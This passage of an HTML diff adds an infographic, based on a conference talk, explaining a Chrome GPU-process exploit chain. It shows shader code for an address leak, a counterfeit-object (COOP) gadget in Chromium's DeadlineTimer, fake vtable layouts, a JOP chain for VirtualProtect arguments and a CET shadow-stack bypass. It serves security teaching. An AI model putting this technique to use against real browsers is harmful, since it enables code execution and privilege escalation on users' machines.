+    buf[0][0][0] = uintBitsToFloat(buffer.value[0x1]);
+    extra[0] = floatBitsToUint(buf[0][0][0]);
+    buf[0][0][1] = uintBitsToFloat(extra[0]);
+    // Leak the address of the Uniform Buffer Object
+    value = floatBitsToUint(buf[0][2][2]);
+}
+</code></pre>
+                             </div>
+                             <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 3:</span> Large array triggers integer overflow</p>
+                             <p class="text-s line-comment"><span class="highlight-yellow">Line 13-15:</span> Forces allocation of GlUniformBufferObject</p>
+                             <p class="text-s line-comment"><span class="highlight-yellow">Line 17:</span> Leaks address of the Uniform Buffer Object</p>
+                         </div>
+                         <div class="stack-diagram">
+                             <h4 class="font-semibold text-center mb-3 text-white text-lg">2. Result: Controlled Allocation</h4>
+                             <div class="stack-label font-semibold text-center mb-1">Memory Layout</div>
+                             <div class="stack-box bg-red-900/50 border-red-500 text-s py-1">Target: 0x23adfe0b100 (UBO addr)</div>
+                             <div class="stack-box border-dashed border-gray-600 text-s py-1">...allocated memory in between...</div>
+                             <div class="stack-box bg-green-900/50 border-green-500 text-s py-1">Array bounds end here</div>
+                             <div class="stack-box bg-yellow-900/50 border-yellow-500 text-s py-1">buf[0xffffff]</div>
+                             <p class="text-center font-semibold text-white-400 mt-3">The shader forces allocation of a GlUniformBufferObject and leaks its address for precise memory layout control.</p>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+        </section>
+
+        <!-- Exploitation Challenge Section -->
+
+            <section class="mb-16 md:mb-24">
+            <div class="text-center mb-12">
+                <h3 class="text-2xl font-bold text-center mb-8 text-white">The Exploitation Challenge</h3>
+                <div class="stat-card p-8">                    
+                    <div class="grid md:grid-cols-2 gap-8 mb-8">
+                        <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                            <h5 class="font-semibold text-white mb-3">What We Have</h5>
+                            <ul class="text-left text-sm text-gray-300 space-y-2">
+                                <li>• <span class="text-white">Read Primitive:</span> Can leak stack addresses</li>
+                                <li>• <span class="text-white">Write Primitive:</span> Can write values to the stack</li>
+                                <li>• <span class="text-white">Allocation Control:</span> Can allocate data at known locations with controlled data</li>
+                                <li>• <span class="text-white">IP Control:</span> Can hijack the instruction pointer</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="p-4 bg-gray-800 border border-gray-600 rounded-lg">
+                            <h5 class="font-semibold text-white mb-3">What's Blocking Us</h5>
+                            <ul class="text-left text-sm text-gray-300 space-y-2">
+                                <li>• <span class="text-red-400">CET defeats ROP:</span> Shadow Stack validates returns</li>
+                                <li>• <span class="text-red-400">CET hinders JOP:</span> Jumping to code that still needs to return</li>
+                                <li>• <span class="text-red-400">CET hinders COP:</span> Difficult to maintain control of IP</li>
+                                <li>• <span class="text-red-400">Need a new approach...</span></li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-8 p-4 bg-gray-900 border border-gray-700 rounded-lg">
+                        <p class="text-lg text-white mb-2">So what can we do?</p>
+                        <p class="text-gray-300">We need a technique that:</p>
+                        <ul class="text-sm text-gray-300 mt-2 space-y-1">
+                            <li>1. Uses <span class="text-yellow-400">legitimate function calls</span></li>
+                            <li>2. Leverages <span class="text-yellow-400">existing code</span></li>
+                            <li>3. Works <span class="text-yellow-400">within CET's rules</span></li>
+                        </ul>
+                    </div>
+                    
+                </div>
+            </div>
+        </section>
+       
+        <!-- Counterfeit Object-Oriented Programming Section -->
+        <section>
+            <div class="text-center mb-12">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Counterfeit Object-Oriented Programming</h3>
+                 <p class="text-gray-400 max-w-3xl mx-auto mb-12">COOP: A code reuse attack targeting C++ applications, introduced by Felix Schuster in 2015.</p>
+                 <a href="https://www.researchgate.net/publication/283121202_Counterfeit_Object-oriented_Programming_On_the_Difficulty_of_Preventing_Code_Reuse_Attacks_in_C_Applications" class="text-blue-400 hover:underline">Read the paper</a>
+            </div>
+            
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">C++ Classes: With vs Without Virtual Functions</h3>
+                 <div class="stat-card p-8">
+                     <div class="grid md:grid-cols-2 gap-8 items-start">
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">1. Regular Class (No Virtuals)</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="5,6"><code class="language-cpp">class SimpleTimer {
+    uint64_t deadline;
+    bool active;
+public:
+    void Stop() { active = false; }  // Direct call
+    void Run() { /* execute */ }     // Direct call
+};
+
+SimpleTimer* timer = new SimpleTimer();
+timer->Stop();  // Direct function call</code></pre>
+                             </div>
+                             <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Lines 5-6:</span> Regular functions use direct calls</p>
+                             
+                             <div class="object-diagram mt-4">
+                                 <div class="object-box">
+                                     <div class="font-bold text-center mb-2">SimpleTimer Object</div>
+                                     <div class="object-field"><span class="offset">0x00:</span><span>deadline</span></div>
+                                     <div class="object-field"><span class="offset">0x08:</span><span>active</span></div>
+                                 </div>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-2">No vtable pointer - just data members</p>
+                         </div>
+                         
+                         <div>
+                             <h4 class="font-semibold text-center mb-4 text-white">2. Class with Virtual Functions</h4>
+                             <div class="code-block text-s">
+<pre class="line-numbers" data-line="5,6"><code class="language-cpp">class Timer {
+    void* vtable_ptr;  // Hidden, compiler-added
+    uint64_t deadline;
+public:
+    virtual void Stop() { ... }  // Indirect call
+    virtual void Run() { ... }   // Indirect call
+};
+
+Timer* timer = new Timer();
+timer->Run();  // Virtual call through vtable</code></pre>
+                             </div>
+                             <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Lines 5-6:</span> Virtual functions require vtable lookup</p>
+                             
+                             <div class="object-diagram mt-4">
+                                 <div class="flex justify-center items-center gap-2">
+                                     <div class="object-box">
+                                         <div class="font-bold text-center mb-2">Timer Object</div>
+                                         <div class="object-field"><span class="offset">0x00:</span><span>vtable_ptr</span></div>
+                                         <div class="object-field"><span class="offset">0x08:</span><span>deadline</span></div>
+                                     </div>
+                                     <div class="pointer-arrow">→</div>
+                                     <div class="object-box">
+                                         <div class="font-bold text-center mb-2">VTable</div>
+                                         <div class="object-field"><span class="offset">0x00:</span><span>&Stop</span></div>
+                                         <div class="object-field"><span class="offset">0x08:</span><span>&Run</span></div>
+                                     </div>
+                                 </div>
+                             </div>
+                             <p class="text-center text-s text-gray-400 mt-2">Hidden vtable pointer added as first member</p>
+                         </div>
+                     </div>
+                     
+                     <div class="mt-6 p-4 bg-gray-800 border border-gray-500 rounded-lg">
+                         <h4 class="font-semibold text-center text-white mb-2">Key Difference: Function Call Assembly</h4>
+                         <div class="grid md:grid-cols-2 gap-4 text-s">
+                             <div>
+                                 <p class="text-center font-semibold text-gray-300 mb-2">Regular Function Call</p>
+                                 <div class="code-block">
+<pre><code class="language-nasm">call SimpleTimer::Stop  ; Direct call to known address</code></pre>
+                                 </div>
+                             </div>
+                             <div>
+                                 <p class="text-center font-semibold text-gray-300 mb-2">Virtual Function Call</p>
+                                 <div class="code-block">
+<pre><code class="language-nasm">mov rax, [rcx]       ; Load vtable pointer
+call [rax+0x8]      ; Indirect call through vtable</code></pre>
+                                 </div>
+                             </div>
+                         </div>
+                         <p class="text-center text-gray-400 mt-3 text-s">Virtual functions enable polymorphism but introduce indirection that COOP exploits</p>
+                     </div>
+                 </div>
+            </div>
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">The COOP Attack Principle</h3>
+                 <div class="stat-card p-8">
+                     <h4 class="font-semibold text-center mb-4 text-white">Counterfeit Objects Replace Real Ones</h4>
+                     <div class="grid md:grid-cols-3 gap-4 mt-6">
+                         <div class="text-center">
+                             <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                                 <p class="font-semibold text-white">1. Control Object Layout</p>
+                                 <p class="text-sm text-gray-300 mt-2">Attacker creates fake objects with controlled vtable pointers</p>
+                             </div>
+                             <div class="mt-3">
+                                 <div class="object-diagram">
+                                     <div class="object-box text-s">
+                                         <div class="font-bold text-center mb-1">Fake Timer Object</div>
+                                         <div class="object-field"><span class="offset">0x00:</span><span>&FakeTimerVtable</span></div>
+                                         <div class="object-field"><span class="offset">0x08:</span><span>data...</span></div>
+                                     </div>
+                                 </div>
+                                 <div class="pointer-arrow text-center">↓</div>
+                                 <div class="object-diagram">
+                                     <div class="object-box text-s">
+                                         <div class="font-bold text-center mb-1">FakeTimerVtable</div>
+                                         <div class="object-field"><span class="offset">0x00:</span><span class="text-yellow-400">&VirtualProtect</span></div>
+                                         <div class="object-field"><span class="offset">0x08:</span><span class="text-yellow-400">&Shellcode</span></div>
+                                     </div>
+                                 </div>
+                             </div>
+                         </div>
+                         <div class="text-center">
+                             <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                                 <p class="font-semibold text-white">2. Hijack Virtual Calls</p>
+                                 <p class="text-sm text-gray-300 mt-2">Virtual function calls become attacker-controlled indirect calls</p>
+                             </div>
+                             <div class="mt-3">
+                                 <div class="code-block text-s">
+<pre><code class="language-nasm">; timer->Stop() becomes:
+mov rax, [rcx]       ; Load fake vtable
+call [rax+0x00]      ; Calls VirtualProtect!
+
+; timer->Run() becomes:
+call [rax+0x08]      ; Executes shellcode!</code></pre>
+                                 </div>
+                             </div>
+                         </div>
+                         <div class="text-center">
+                             <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                                 <p class="font-semibold text-white">3. Chain Functions</p>
+                                 <p class="text-sm text-gray-300 mt-2">Chain existing functions together to achieve arbitrary behavior</p>
+                             </div>
+                             <div class="mt-3">
+                                 <div class="code-block text-s">
+<pre><code class="language-cpp">// Original code path:
+timer->Stop();  // 1. VirtualProtect
+timer->Run();   // 2. Shellcode
+
+// Result: Memory made executable,
+// then shellcode runs</code></pre>
+                                 </div>
+                             </div>
+                         </div>
+                     </div>
+                     <p class="text-center text-gray-400 mt-6 text-sm">COOP bypasses CFI by using legitimate virtual call sites with counterfeit objects.</p>
+                 </div>
+            </div>
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Finding the Perfect COOP Gadget</h3>
+                 <div class="stat-card p-8">
+                     <h4 class="font-semibold text-center mb-4 text-white">Requirements for Our Virtual Call Site</h4>
+                     <div class="grid md:grid-cols-2 gap-4 mb-6">
+                         <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                             <p class="font-semibold text-white mb-2">1. Make Memory Executable (GlUniformBufferObject)</p>
+                             <p class="text-sm text-gray-300">First virtual call must be redirectable to VirtualProtect</p>
+                         </div>
+                         <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                             <p class="font-semibold text-white mb-2">2. Execute Our Code</p>
+                             <p class="text-sm text-gray-300">Second virtual call must call our shellcode</p>
+                         </div>
+                     </div>
+                     
+                     <div class="mt-8">
+                         <h4 class="font-semibold text-center mb-4 text-white">The Perfect Target: DeadlineTimer::OnScheduledTaskInvoked</h4>
+                         <div class="code-block text-s">
+<pre class="line-numbers" data-line="8,9"><code class="language-cpp">void DeadlineTimer::OnScheduledTaskInvoked() {
+  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);
+  DCHECK(!delayed_task_handle_.IsValid());
+
+  // Make a local copy of the task to run. The Stop method will reset the
+  // |user_task_| member.
+  OnceClosure task = std::move(user_task_);
+  Stop();                  // Virtual call #1 - Perfect for VirtualProtect
+  std::move(task).Run();   // Virtual call #2 - Perfect for shellcode execution
+}</code></pre>
+                         </div>
+                         <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 8:</span> First virtual call - we'll hijack this to call VirtualProtect</p>
+                         <p class="text-s line-comment"><span class="highlight-yellow">Line 9:</span> Second virtual call - we'll hijack this to execute our shellcode</p>
+                         <p class="text-center text-gray-400 mt-3 text-s">Two sequential virtual calls with controlled object = perfect COOP gadget</p>
+                         <a class="text-blue-500 hover:underline mt-4 block text-center" href="https://source.chromium.org/chromium/chromium/src/+/main:base/timer/timer.cc;drc=fdb064a8a8c84cec61a52bbac9a387fdeae3d690;l=295">View the full source code on Chromium</a>
+                     </div>
+                 </div>
+            </div>
+
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Disassembly Analysis: How The COOP Gadget Works</h3>
+                 <div class="stat-card p-8">
+                     <div class="code-block text-s">
+<pre class="line-numbers" data-line="8,9,13,15,20,23"><code class="language-nasm">; DeadlineTimer::OnScheduledTaskInvoked()
+; RCX = `this` pointer 
+; (points to our FakeDeadlineTimer object)
+push rsi
+sub rsp, 20
+
+; --- Part 1: Move the task object (std::move(user_task_)) ---
+mov rax, [rcx]                       ; Load vtable pointer from our fake object
+mov rsi, [rcx+0x48]                  ; Load 'user_task_' pointer (points to our payload)
+mov [rcx+0x48], 0                    ; Zero out the pointer
+
+; --- Part 2: Call Stop()            -> Hijacked to call VirtualProtect ---
+mov rax, [rax+0x10]                  ; Load function pointer from fake vtable offset 0x10
+                                     ; We placed &VirtualProtect here
+call __guard_dispatch_icall_fptr
+                                     ; CFG allows this - VirtualProtect is a valid target!
+                                     ; Makes our shellcode executable
+
+; --- Part 3: Call Run()             -> Hijacked to execute shellcode ---
+mov rax, [rsi+8]                     ; Load &Payload from our counterfeit object
+
+mov rcx, rsi                         ; Set 'this' pointer for the call
+call __guard_dispatch_icall_fptr     ; Executes our shellcode
+
+; --- Cleanup ---
+test rsi, rsi
+jne chrome.0x7~
+add rsp, 0x20
+pop rsi
+ret</code></pre>
+                     </div>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 8:</span> Loads our controlled vtable pointer</p>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 9:</span> Loads user_task_ which points to our payload</p>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Line 13:</span> Loads VirtualProtect from our fake vtable</p>
+                     <p class="text-s mt-1 line-comment"><span class="highlight-red">Line 13:</span> Calls VirtualProtect</p>
+                     <p class="text-s line-comment"><span class="highlight-yellow">Line 20:</span> Loads &Shellcode from our fake vtable</p>
+                     <p class="text-s line-comment"><span class="highlight-red">Line 23:</span> Second hijacked call - jumps to our shellcode</p>
+                     
+                     <div class="mt-6 p-4 bg-gray-800 border border-gray-500 rounded-lg">
+                         <h4 class="font-semibold text-center text-white mb-2">Why This COOP Gadget is Perfect</h4>
+                         <ul class="text-s text-gray-300 space-y-1">
+                             <li>• Two virtual calls in sequence - exactly what we need</li>
+                             <li>• No validation between calls - both execute unconditionally</li>
+                             <li>• CFG allows VirtualProtect as a valid call target</li>
+                             <li>• The object pointer (RCX) is preserved between calls</li>
+                             <li>• Common function in Chrome - likely to be present</li>
+                         </ul>
+                     </div>
+                 </div>
+            </div>          
+                <div class="mt-8">
+                    <h4 class="font-semibold text-center text-white mb-4">Counterfeit Object Layout</h4>
+                    <div class="object-diagram">
+                        <div class="flex justify-center items-start gap-4 flex-wrap">
+                            <div>
+                                <div class="object-box">
+                                    <div class="font-bold text-center mb-2">FakeDeadlineTimer</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>&FakeVtable</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span>padding</span></div>
+                                    <div class="object-field"><span class="offset">...</span><span>...</span></div>
+                                    <div class="object-field"><span class="offset">0x48:</span><span>&FakeDeadlineTimer+0x50</span></div>
+                                    <div class="object-field"><span class="offset">0x50:</span><span>0x0000000000000000</span></div>
+                                    <div class="object-field"><span class="offset">0x58:</span><span>&Shellcode</span></div>
+                                    <div class="object-field"><span class="offset">0x60:</span><span>Shellcode bytes...</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Counterfeit object in GlUniformBuffer</p>
+                            </div>
+                            
+                            <div class="flex flex-col justify-center">
+                                <div class="pointer-arrow text-center">→</div>
+                                <div class="pointer-arrow text-center mt-8">→</div>
+                            </div>
+                            
+                            <div>
+                                <div class="object-box">
+                                    <div class="font-bold text-center mb-2">FakeVtable</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>unused</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span>unused</span></div>
+                                    <div class="object-field"><span class="offset">0x10:</span><span class="highlight-yellow">&VirtualProtect</span></div>
+                                    <div class="object-field"><span class="offset">0x18:</span><span>unused</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Stop() → VirtualProtect</p>
+                                
+                                <div class="object-box mt-4">
+                                    <div class="font-bold text-center mb-2">Payload Structure</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>0x0000000000000000</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span class="highlight-yellow">&Shellcode</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Run() → Shellcode</p>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-center text-gray-400 mt-4 text-s">
+                        The object's user_task_ member (offset 0x48) points to offset 0x50, creating a self-referential structure that satisfies the COOP gadget's requirements.
+                    </p>
+                </div>
+            </div>
+
+            <div class="mt-16">
+                 <h3 class="text-2xl font-bold text-center mb-8 text-white">Finding JOP Gadgets for Argument Setup</h3>
+                 <div class="stat-card p-8">
+                     <h4 class="font-semibold text-center mb-4 text-white">The Challenge: Setting VirtualProtect Arguments</h4>
+                     <p class="text-center text-gray-400 mb-6">VirtualProtect requires specific arguments in Windows x64 calling convention:</p>
+                     
+                     <div class="grid md:grid-cols-2 gap-4 mb-6">
+                         <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                             <h5 class="font-semibold text-white mb-2">VirtualProtect Parameters</h5>
+                             <div class="code-block text-s">
+<pre><code class="language-cpp">BOOL VirtualProtect(
+  RCX: LPVOID lpAddress,      // Our fake object
+  RDX: SIZE_T dwSize,         // Size to protect
+  R8:  DWORD flNewProtect,    // PAGE_EXECUTE_READWRITE
+  R9:  PDWORD lpflOldProtect  // Output buffer
+);</code></pre>
+                             </div>
+                         </div>
+                         <div class="p-4 bg-gray-700 border border-gray-500 rounded-lg">
+                             <h5 class="font-semibold text-white mb-2">What We Need</h5>
+                             <ul class="text-s text-gray-300 space-y-1">
+                                 <li>• RCX → Address of our counterfeit object</li>
+                                 <li>• RDX → Size (e.g., 0x1000)</li>
+                                 <li>• R8 → 0x40 (PAGE_EXECUTE_READWRITE)</li>
+                                 <li>• R9 → Valid writable address</li>
+                                 <li>• Then jump to our COOP gadget</li>
+                             </ul>
+                         </div>
+                     </div>
+                     
+                     <div class="mt-8">
+                         <h4 class="font-semibold text-center mb-4 text-white">The Perfect JOP Chain</h4>
+                         <h5 class="text-lg text-yellow-400 text-center mb-2">What we wish could have found</h5>
+                         <div class="code-block text-s">
+<pre class="line-numbers" data-line="1,2,3,4,6"><code class="language-nasm">pop rdx       ; Pop value for dwSize (0x1000)
+pop r8        ; Pop value for flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
+pop r9        ; Pop value for lpflOldProtect (writable address)
+pop rcx       ; Pop pointer to our FakeDeadlineTimerObject
+pop rax       ; Pop address of DeadlineTimer::OnScheduledTaskInvoked
+jmp rax       ; Jump to our COOP gadget</code></pre>
+                         </div>
+                         <p class="text-s mt-1 line-comment"><span class="highlight-yellow">Lines 1-4:</span> Set up all arguments for VirtualProtect</p>
+                         <p class="text-s line-comment"><span class="highlight-yellow">Line 6:</span> Transfer control to our COOP gadget</p>
+                         <div class="mt-6">
+                             <h4 class="font-semibold text-center text-white mb-2">Example Stack Layout for this</h4>
+                             <div class="stack-diagram">
+                                 <div class="flex justify-center">
+                                     <div>
+                                         <div class="stack-box">0x1000 (dwSize)</div>
+                                         <div class="stack-box">0x40 (PAGE_EXECUTE_READWRITE)</div>
+                                         <div class="stack-box">&OldProtect (writable addr)</div>
+                                         <div class="stack-box highlight-yellow">&FakeDeadlineTimer</div>
+                                         <div class="stack-box">&OnScheduledTaskInvoked</div>
+                                         <div class="stack-box">...</div>
+                                     </div>
+                                 </div>
+                                 <p class="text-center text-s text-gray-200 mt-4">Stack is prepared with all arguments before jumping to JOP gadget</p>
+                             </div>
+                         </div>
+                     </div>
+                 </div>
+            </div>
+
+        </section></br>
+
+
+<!-- The Full Exploit Chain Section -->
+
+        <section id="key" class="mb-16 md:mb-24">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-12 text-white">The Full Exploit Chain</h2>
+            <p class="text-center text-gray-400 max-w-3xl mx-auto mb-12">With control over the instruction pointer but facing modern defenses, the exploit uses a multi-stage process to achieve code execution.</p>
+            
+            <div class="stat-card p-8 space-y-4">
+                <!-- Stage 1 -->
+                <div class="exploit-chain-box bg-gray-800/50">
+                    <p class="font-bold text-lg text-white">Stage 1: First, We Craft Our Fake Object</p>
+                    <p class="text-sm text-gray-300">Using our bug primitives, we allocate a glUniform buffer and craft a counterfeit `DeadlineTimer` object inside it. We control its entire layout.</p>
+                    <div class="object-diagram">
+                        <div class="flex justify-center items-start gap-4 flex-wrap">
+                            <div>
+                                <div class="object-box">
+                                    <div class="font-bold text-center mb-2">FakeDeadlineTimer</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>&FakeVtable</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span>padding</span></div>
+                                    <div class="object-field"><span class="offset">...</span><span>...</span></div>
+                                    <div class="object-field"><span class="offset">0x48:</span><span>&FakeDeadlineTimer+0x50</span></div>
+                                    <div class="object-field"><span class="offset">0x50:</span><span>0x0000000000000000</span></div>
+                                    <div class="object-field"><span class="offset">0x58:</span><span>&Shellcode</span></div>
+                                    <div class="object-field"><span class="offset">0x60:</span><span>Shellcode bytes...</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Counterfeit object in GlUniformBuffer</p>
+                            </div>
+                            
+                            <div class="flex flex-col justify-center">
+                                <div class="pointer-arrow text-center">→</div>
+                                <div class="pointer-arrow text-center mt-8">→</div>
+                            </div>
+                            
+                            <div>
+                                <div class="object-box">
+                                    <div class="font-bold text-center mb-2">FakeVtable</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>unused</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span>unused</span></div>
+                                    <div class="object-field"><span class="offset">0x10:</span><span class="highlight-yellow">&VirtualProtect</span></div>
+                                    <div class="object-field"><span class="offset">0x18:</span><span>unused</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Stop() → VirtualProtect</p>
+                                
+                                <div class="object-box mt-4">
+                                    <div class="font-bold text-center mb-2">Payload Structure</div>
+                                    <div class="object-field"><span class="offset">0x00:</span><span>0x0000000000000000</span></div>
+                                    <div class="object-field"><span class="offset">0x08:</span><span class="highlight-yellow">&Shellcode</span></div>
+                                </div>
+                                <p class="text-center text-s text-gray-400 mt-2">Run() → Shellcode</p>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-center text-gray-400 mt-4 text-s">
+                        The object's user_task_ member (offset 0x48) points to offset 0x50, creating a self-referential structure that satisfies the COOP gadget's requirements.
+                    </p>
+                </div>
+                <div class="text-center exploit-chain-arrow">↓</div>
+
+                <!-- Stage 2 -->
+                <div class="exploit-chain-box bg-gray-800/50">
+                    <p class="font-bold text-lg text-white">Stage 2: Stack Setup & Initial Control</p>
+                    <p class="text-sm text-gray-300 text-center">Before triggering the final return, we use the bug's primitives to prepare the stack</p>
+                    <div class="mt-3 space-y-2">
+                        <div class="flex items-center justify-center text-center">
+                            <div>
+                                <span class="text-white font-semibold block">Leak Object Address</span>
+                                <span class="text-white text-s">The counterfeit object's memory location is discovered using the read primitive</span>
+                            </div>
+                        </div>
+                        <div class="flex items-center justify-center text-center">
+                            <div>
+                                <span class="text-white font-semibold block">Populate JOP Chain</span>
+                                <span class="text-white text-s">Stack is carefully filled with gadget addresses for argument setup using the write primitive</span>
+                            </div>
+                        </div>
+                        <div class="flex items-center justify-center text-center">
+                            <div>
+                                <span class="text-white font-semibold block">Hijack Return Address</span>
+                                <span class="text-white text-s">The saved RIP is overwritten to point to our JOP chain start</span>
+                            </div>
+                        </div>
+                        <div class="flex items-center justify-center text-center">
+                            <div>
+                                <span class="text-white font-semibold block">The Shader finishes and executes the <span class="highlight-red">RET</span> instruction</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="text-center exploit-chain-arrow">↓</div>
+
+                <!-- Stage 3 -->
+                <div class="exploit-chain-box bg-gray-700/50">
+                    <p class="font-bold text-lg text-white">Stage 3: CET Bypass</p>
+                    <p class="text-sm text-gray-300">The kernel's compatibility logic checks the return. Since the shader is non-CETCOMPAT dynamic code, the return is <span class="font-bold text-green-400">ALLOWED</span>.</p>
+                    <p class="text-s text-gray-400 mt-2">Shadow Stack is bypassed. RIP now points to our JOP chain.</p>
+                </div>
+                <div class="text-center exploit-chain-arrow">↓</div>
+
+                <!-- Stage 4 -->
+                <div class="exploit-chain-box bg-gray-800/50">
+                    <p class="font-bold text-lg text-white">Stage 4: Argument Engineering</p>
+                    <p class="text-sm text-gray-300">A "call-less" JOP chain executes, loading registers with arguments for `VirtualProtect` and placing a pointer to our Counterfeit Object into `RCX`.</p>
+                    <div class="code-block text-left text-s mt-4">
+<pre class="line-numbers" data-line="6"><code class="language-nasm">pop rdx       ; Pop value for dwSize
+pop r8        ; Pop value for flNewProtect
+pop r9        ; Pop value for lpflOldProtect
+pop rcx       ; Pop pointer to our FakeDeadlineTimerObject
+pop rax       ; Pop address for the next jump target
+jmp rax       ; Jump to DeadlineTimer::OnScheduledTaskInvoked</code></pre>
+                    </div>
+                    <p class="text-s text-gray-400 mt-2">This perfect gadget sets all arguments for VirtualProtect then jumps to our target function.</p>
+                </div>
+                <div class="text-center exploit-chain-arrow">↓</div>
+
+                <!-- Stage 6 -->
+                <div class="exploit-chain-box bg-gray-800/50">
+                    <p class="font-bold text-lg text-white">Stage 5: Counterfeit Object Execution</p>
+                    <div class="code-block text-left text-s mt-4">
+<pre class="line-numbers" data-line="3,4"><code class="language-cpp">void DeadlineTimer::OnScheduledTaskInvoked() {
+  
+    // Move our user_task_ obj
+    OnceClosure task = std::move(user_task_);
+
+    // &VirtualProtect
+    Stop();
+
+    // &Shellcode
+    std::move(task).Run();
+}</code></pre>
+                    </div>
+                    <p class="text-s mt-1 text-left line-comment"><span class="highlight-yellow">Line 3:</span> Stop() hijacked to call VirtualProtect</p>
+                    <p class="text-s text-left line-comment"><span class="highlight-yellow">Line 4:</span> Run() hijacked to execute shellcode</p>
+                </div>
+                <div class="text-center exploit-chain-arrow">↓</div>
+                <!-- Stage 7 -->
+                <div class="exploit-chain-box bg-gray-800/50">
+                    <p class="font-bold text-lg text-white">Stage 6: LPE</p>
+                    <p class="text-sm text-gray-300">The shellcode will trigger LPE and will be downloaded and executed by the GPU process.</p>
+                </div>
+            </div>
+        </section>
+        <footer class="text-center text-gray-500 text-sm">
+            <p>Infographic based on the presentation "Bypassing Intel CET with Counterfeit Objects" by Tom Pitt & James Fraser.</p>
+        </footer>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Custom line highlighting implementation
+            setTimeout(() => {
+                document.querySelectorAll('pre[data-line]').forEach(pre => {
+                    const highlightLines = pre.getAttribute('data-line').split(',').map(l => parseInt(l.trim()));
+                    const lineNumbersRows = pre.querySelector('.line-numbers-rows');
+                    
+                    if (lineNumbersRows) {
+                        const spans = lineNumbersRows.querySelectorAll('span');
+                        spans.forEach((span, index) => {
+                            if (highlightLines.includes(index + 1)) {
+                                span.setAttribute('data-highlighted', 'true');
+                            }
+                        });
+                    }
+                });
+            }, 100); // Small delay to ensure Prism.js has finished
+        });
+    </script>
+
+</body>
+</html>
